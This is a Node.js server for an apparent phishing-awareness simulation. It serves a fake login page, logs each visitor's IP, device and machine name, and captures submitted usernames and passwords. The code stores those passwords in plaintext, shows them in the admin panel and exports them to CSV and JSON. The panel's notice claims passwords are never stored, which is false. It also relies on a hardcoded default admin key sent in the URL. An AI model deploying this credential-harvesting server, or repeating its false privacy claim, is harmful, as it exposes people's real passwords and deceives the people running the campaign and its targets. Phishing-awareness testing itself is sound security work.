const env = process.argv[2] || 'dev';
require('dotenv').config({ path: `.env.${env}` });
console.log(`\n  Ambiente: ${env} (.env.${env})\n`);

const express = require('express');
const rateLimit = require('express-rate-limit');
const fs = require('fs');
const path = require('path');
const dns = require('dns');
const { exec } = require('child_process');
const os = require('os');

const app = express();
const PORT = process.env.PORT || 3333;
const HOST = process.env.HOST || '0.0.0.0';
const ADMIN_KEY = process.env.ADMIN_KEY || 'aintar-admin-2024';
const DATA_DIR  = process.env.DATA_DIR  || path.join(__dirname, 'data');
const DATA_FILE = path.join(DATA_DIR, 'results.json');

// ─── Persistência ──────────────────────────────────────────────────────────

function ensureDataDir() {
  if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
}

function loadData() {
  ensureDataDir();
  if (!fs.existsSync(DATA_FILE)) {
    fs.writeFileSync(DATA_FILE, JSON.stringify({ clicks: [], submissions: [] }, null, 2));
  }
  return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8').replace(/^﻿/, ''));
}

function saveData(data) {
  ensureDataDir();
  fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

// Write queue — garante que o ciclo load→modify→save nunca corre em paralelo,
// eliminando race conditions quando múltiplos utilizadores clicam ao mesmo tempo.
let writeQueue = Promise.resolve();

function appendRecord(type, record) {
  writeQueue = writeQueue
    .then(() => {
      const data = loadData();
      data[type].push(record);
      saveData(data);
    })
    .catch(err => console.error('[writeQueue]', err));
  return writeQueue;
}

function getClientIp(req) {
  return (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
}

// PowerShell GetHostEntry — DNS + NetBIOS + hosts file em simultâneo (mais fiável)
function psHostname(ip) {
  const cleanIp = ip.replace(/^::ffff:/, '');
  if (!/^[\d.:a-fA-F]+$/.test(cleanIp)) return Promise.resolve(null);
  return new Promise((resolve) => {
    const t = setTimeout(() => resolve(null), 3000);
    exec(
      `powershell -NoProfile -Command "try{[System.Net.Dns]::GetHostEntry('${cleanIp}').HostName}catch{''}"`,
      (err, stdout) => {
        clearTimeout(t);
        const name = (stdout || '').trim();
        resolve(name && name !== cleanIp ? name : null);
      }
    );
  });
}

// Fallback NetBIOS direto para máquinas Windows na mesma rede
function nbtstat(ip) {
  const cleanIp = ip.replace(/^::ffff:/, '');
  if (!/^[\d.]+$/.test(cleanIp)) return Promise.resolve(null);
  return new Promise((resolve) => {
    const t = setTimeout(() => resolve(null), 3000);
    exec(`nbtstat -A ${cleanIp}`, (err, stdout) => {
      clearTimeout(t);
      if (err || !stdout) return resolve(null);
      const match = stdout.match(/^\s*([A-Z0-9_\-]{1,15})\s+<00>\s+UNIQUE/im);
      resolve(match ? match[1].trim() : null);
    });
  });
}

function friendlyNameFromUA(ua) {
  if (!ua) return null;
  // iPhone
  const iosMatch = ua.match(/iPhone OS ([\d_]+)/i);
  if (iosMatch) return `iPhone (iOS ${iosMatch[1].replace(/_/g, '.')})`;
  // iPad
  const ipadMatch = ua.match(/iPad.*OS ([\d_]+)/i);
  if (ipadMatch) return `iPad (iPadOS ${ipadMatch[1].replace(/_/g, '.')})`;
  // Android — tenta apanhar o modelo
  const androidModel = ua.match(/;\s*([^;)]+)\s+Build\//i);
  const androidVer  = ua.match(/Android ([\d.]+)/i);
  if (androidVer) {
    const model = androidModel ? androidModel[1].trim() : 'Android';
    return `${model} (Android ${androidVer[1]})`;
  }
  return null;
}

async function resolveHostname(ip, ua) {
  const cleanIp = ip.replace(/^::ffff:/, '');
  if (cleanIp === '::1' || cleanIp === '127.0.0.1') return os.hostname();
  const byPs = await psHostname(ip);
  if (byPs) return byPs;
  const byNbt = await nbtstat(ip);
  if (byNbt) return byNbt;
  // Fallback: nome amigável extraído do User Agent (útil para telemóveis)
  return friendlyNameFromUA(ua);
}

// ─── Rate limiting ───────────────────────────────────────────────────────────

// Localhost e IPs internos nunca são bloqueados (útil para testes e admin)
function skipLocalAndInternal(req) {
  const ip = getClientIp(req).replace(/^::ffff:/, '');
  return (
    ip === '127.0.0.1' ||
    ip === '::1' ||
    ip.startsWith('10.') ||
    ip.startsWith('192.168.') ||
    /^172\.(1[6-9]|2\d|3[01])\./.test(ip)
  );
}

// Página de login: máx. 1000 acessos por IP em 10 minutos
const clickLimiter = rateLimit({
  windowMs: 10 * 60 * 1000,
  max: 1000,
  skip: skipLocalAndInternal,
  standardHeaders: true,
  legacyHeaders: false,
  message: '<h2>Demasiados pedidos. Tente novamente mais tarde.</h2>',
});

// Submissão de credenciais: máx. 500 tentativas por IP em 15 minutos
const submitLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 500,
  skip: skipLocalAndInternal,
  standardHeaders: true,
  legacyHeaders: false,
  message: '<h2>Demasiados pedidos. Tente novamente mais tarde.</h2>',
});

// Painel admin: máx. 1000 acessos por IP em 5 minutos
const adminLimiter = rateLimit({
  windowMs: 5 * 60 * 1000,
  max: 1000,
  skip: skipLocalAndInternal,
  standardHeaders: true,
  legacyHeaders: false,
  message: '<h2>Demasiados pedidos. Tente novamente mais tarde.</h2>',
});

// ─── Middlewares ────────────────────────────────────────────────────────────

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ─── Rotas públicas ─────────────────────────────────────────────────────────
// NOTA: o static deve vir DEPOIS das rotas, senão o index.html é servido
// directamente pelo middleware sem passar pelo registo de clique.

// Página de login falsa — regista o clique (aceita / e /v2/)
async function handleClick(req, res) {
  const token = (req.query.t || 'sem-token').replace(/[^a-zA-Z0-9_-]/g, '');
  const ip = getClientIp(req);
  const ua = req.headers['user-agent'] || '';
  const hostname = await resolveHostname(ip, ua);

  await appendRecord('clicks', { token, ip, hostname, userAgent: ua, timestamp: new Date().toISOString() });

  res.sendFile(path.join(__dirname, 'public', 'index.html'));
}

async function handleSubmit(req, res) {
  const token = (req.body.token || 'sem-token').replace(/[^a-zA-Z0-9_-]/g, '');
  const username = (req.body.username || '').trim().substring(0, 100);
  const password = (req.body.password || '').substring(0, 200);
  const ip = getClientIp(req);
  const ua = req.headers['user-agent'] || '';
  const hostname = await resolveHostname(ip, ua);

  await appendRecord('submissions', { token, username, password, ip, hostname, userAgent: ua, timestamp: new Date().toISOString() });

  const prefix = req.path.startsWith('/v1/') ? '/v1' : '';
  res.redirect(`${prefix}/awareness.html`);
}

app.get('/',            clickLimiter,  handleClick);
app.get('/v1',          clickLimiter,  handleClick);
app.get('/v1/',         clickLimiter,  handleClick);
app.get('/v1/login',    clickLimiter,  handleClick);
app.get('/v2',          clickLimiter,  handleClick);
app.get('/v2/',         clickLimiter,  handleClick);
app.get('/v2/login',    clickLimiter,  handleClick);
app.post('/submit',            submitLimiter, handleSubmit);
app.post('/v1/submit',         submitLimiter, handleSubmit);
app.post('/v1/login/submit',   submitLimiter, handleSubmit);
app.post('/v2/submit',         submitLimiter, handleSubmit);
app.post('/v2/login/submit',   submitLimiter, handleSubmit);

app.get('/v1/awareness.html', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'awareness.html'));
});

// Ficheiros estáticos (awareness.html, logos, etc.) — depois das rotas
app.use(express.static(path.join(__dirname, 'public')));

// ─── Painel de administração ────────────────────────────────────────────────

function adminGuard(req, res, next) {
  if (req.query.key !== ADMIN_KEY) {
    return res.status(401).send('<h2>401 — Acesso não autorizado.</h2>');
  }
  next();
}

app.get('/admin', adminLimiter, adminGuard, (req, res) => {
  const data = loadData();
  const key = ADMIN_KEY;

  // Junta todos os eventos numa lista ordenada por data (mais recente primeiro)
  const events = [
    ...data.clicks.map(e => ({ ...e, tipo: 'click' })),
    ...data.submissions.map(e => ({ ...e, tipo: 'submission' })),
  ].sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

  const rows = events.map(e => {
    const ua = parseUA(e.userAgent);
    const deviceIcon = ua.device === 'Mobile' ? '📱' : ua.device === 'Tablet' ? '📟' : '🖥️';
    const tipo = e.tipo === 'submission'
      ? '<span style="color:#d32f2f;font-weight:bold">⚠️ Inseriu credenciais</span>'
      : '<span style="color:#f57c00;font-weight:bold">👁 Clicou no link</span>';

    return `
      <tr>
        <td>${tipo}</td>
        <td>${new Date(e.timestamp).toLocaleString('pt-PT')}</td>
        <td>${e.tipo === 'submission' ? escHtml(e.username || '—') : '—'}</td>
        <td>${e.tipo === 'submission' ? escHtml(e.password || '—') : '—'}</td>
        <td>${deviceIcon} ${escHtml(ua.device)}</td>
        <td>${escHtml(ua.os)}</td>
        <td>${escHtml(ua.browser)}</td>
        <td><small>${escHtml(e.ip || '—')}</small></td>
        <td><small>${e.hostname ? escHtml(e.hostname) : '<span style="color:#bbb">sem registo</span>'}</small></td>
      </tr>`;
  }).join('');

  res.send(`<!DOCTYPE html>
<html lang="pt">
<head>
<meta charset="UTF-8">
<meta http-equiv="refresh" content="5">
<title>Admin — Phishing Sim</title>
<style>
  body { font-family: 'Segoe UI', sans-serif; background: #f5f5f5; margin: 0; padding: 24px; }
  h1 { color: #1a237e; }
  .stats { display:flex; gap:16px; margin-bottom:24px; flex-wrap:wrap; }
  .stat { background:#fff; border-radius:8px; padding:20px 28px; box-shadow:0 2px 6px rgba(0,0,0,.12); min-width:140px; }
  .stat .num { font-size:2rem; font-weight:700; }
  .stat .lbl { color:#666; font-size:.85rem; }
  table { width:100%; border-collapse:collapse; background:#fff; border-radius:8px; overflow:hidden; box-shadow:0 2px 6px rgba(0,0,0,.12); }
  th { background:#1a237e; color:#fff; padding:12px 16px; text-align:left; font-size:.9rem; }
  td { padding:11px 16px; border-bottom:1px solid #eee; font-size:.9rem; vertical-align:middle; }
  tr:last-child td { border-bottom:none; }
  tr:hover td { background:#f3f4ff; }
  .actions { margin-bottom:16px; display:flex; gap:10px; }
  .btn { padding:8px 16px; border:none; border-radius:6px; cursor:pointer; font-size:.9rem; text-decoration:none; display:inline-block; }
  .btn-danger { background:#d32f2f; color:#fff; }
  .btn-export { background:#1976d2; color:#fff; }
  .notice { background:#fff3e0; border-left:4px solid #f57c00; padding:12px 16px; border-radius:4px; margin-bottom:20px; font-size:.9rem; }
</style>
</head>
<body>
<h1>&#128272; Painel — Simulação de Phishing</h1>
<div class="notice">
  <strong>Nota:</strong> As passwords <u>nunca</u> são armazenadas. Este painel apenas regista
  quem clicou no link e quem tentou submeter credenciais (nome de utilizador).
</div>
<div class="stats">
  <div class="stat"><div class="num">${data.clicks.length}</div><div class="lbl">Cliques no link</div></div>
  <div class="stat"><div class="num" style="color:#d32f2f">${data.submissions.length}</div><div class="lbl">Credenciais inseridas</div></div>
  <div class="stat"><div class="num">${events.length}</div><div class="lbl">Total de eventos</div></div>
</div>
<div class="actions">
  <a class="btn btn-export" href="/admin/export?key=${escHtml(key)}">&#8659; Exportar JSON</a>
  <a class="btn btn-export" href="/admin/export-csv?key=${escHtml(key)}">&#8659; Exportar CSV</a>
  <a class="btn btn-danger" href="/admin/clear?key=${escHtml(key)}" onclick="return confirm('Apagar todos os dados?')">&#128465; Limpar dados</a>
</div>
<table>
  <thead>
    <tr>
      <th>Tipo</th>
      <th>Data / Hora</th>
      <th>Utilizador inserido</th>
      <th>Palavra-passe</th>
      <th>Dispositivo</th>
      <th>Sistema Operativo</th>
      <th>Browser</th>
      <th>IP</th>
      <th>Nome da Máquina</th>
    </tr>
  </thead>
  <tbody>
    ${rows || '<tr><td colspan="8" style="text-align:center;color:#999;padding:32px">Sem dados ainda</td></tr>'}
  </tbody>
</table>
</body></html>`);
});

app.get('/admin/export', adminGuard, (req, res) => {
  res.setHeader('Content-Disposition', 'attachment; filename="phishing-results.json"');
  res.setHeader('Content-Type', 'application/json');
  res.send(JSON.stringify(loadData(), null, 2));
});

app.get('/admin/export-csv', adminGuard, (req, res) => {
  const data = loadData();
  let csv = 'tipo,token,username,password,ip,timestamp,userAgent\n';
  data.clicks.forEach(c => {
    csv += `click,${csvCell(c.token)},,${csvCell(c.ip)},${c.timestamp},${csvCell(c.userAgent)}\n`;
  });
  data.submissions.forEach(s => {
    csv += `submission,${csvCell(s.token)},${csvCell(s.username)},${csvCell(s.password)},${csvCell(s.ip)},${s.timestamp},\n`;
  });
  res.setHeader('Content-Disposition', 'attachment; filename="phishing-results.csv"');
  res.setHeader('Content-Type', 'text/csv');
  res.send(csv);
});

app.get('/admin/clear', adminGuard, (req, res) => {
  saveData({ clicks: [], submissions: [] });
  res.redirect(`/admin?key=${ADMIN_KEY}`);
});

// ─── Utilitários ─────────────────────────────────────────────────────────────

function parseUA(ua) {
  if (!ua) return { os: '—', browser: '—', device: '—' };

  // Device type
  let device = 'Desktop';
  if (/Mobile|Android.*Mobile|iPhone|iPod/i.test(ua)) device = 'Mobile';
  else if (/iPad|Android(?!.*Mobile)/i.test(ua)) device = 'Tablet';

  // OS
  let os = '—';
  if (/Windows NT 10/i.test(ua))       os = 'Windows 10/11';
  else if (/Windows NT 6\.3/i.test(ua)) os = 'Windows 8.1';
  else if (/Windows NT 6\.1/i.test(ua)) os = 'Windows 7';
  else if (/Windows/i.test(ua))         os = 'Windows';
  else if (/iPhone OS ([\d_]+)/i.test(ua)) os = 'iOS ' + RegExp.$1.replace(/_/g, '.');
  else if (/iPad.*OS ([\d_]+)/i.test(ua))  os = 'iPadOS ' + RegExp.$1.replace(/_/g, '.');
  else if (/Android ([\d.]+)/i.test(ua))   os = 'Android ' + RegExp.$1;
  else if (/Mac OS X ([\d_]+)/i.test(ua))  os = 'macOS ' + RegExp.$1.replace(/_/g, '.');
  else if (/Linux/i.test(ua))              os = 'Linux';

  // Browser
  let browser = '—';
  if (/Edg\/([\d.]+)/i.test(ua))           browser = 'Edge ' + RegExp.$1.split('.')[0];
  else if (/OPR\/([\d.]+)/i.test(ua))      browser = 'Opera ' + RegExp.$1.split('.')[0];
  else if (/Chrome\/([\d.]+)/i.test(ua))   browser = 'Chrome ' + RegExp.$1.split('.')[0];
  else if (/Firefox\/([\d.]+)/i.test(ua))  browser = 'Firefox ' + RegExp.$1.split('.')[0];
  else if (/Safari\/([\d.]+)/i.test(ua) && !/Chrome/i.test(ua)) browser = 'Safari';
  else if (/MSIE|Trident/i.test(ua))       browser = 'IE';

  return { os, browser, device };
}

function escHtml(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

function csvCell(val) {
  const s = String(val || '').replace(/"/g, '""');
  return `"${s}"`;
}

// ─── Start ───────────────────────────────────────────────────────────────────

app.listen(PORT, HOST, () => {
  console.log(`\n  Phishing Sim a correr em: http://${HOST}:${PORT}/v2/`);
  console.log(`  Painel admin:             http://${HOST}:${PORT}/admin?key=${ADMIN_KEY}`);
});
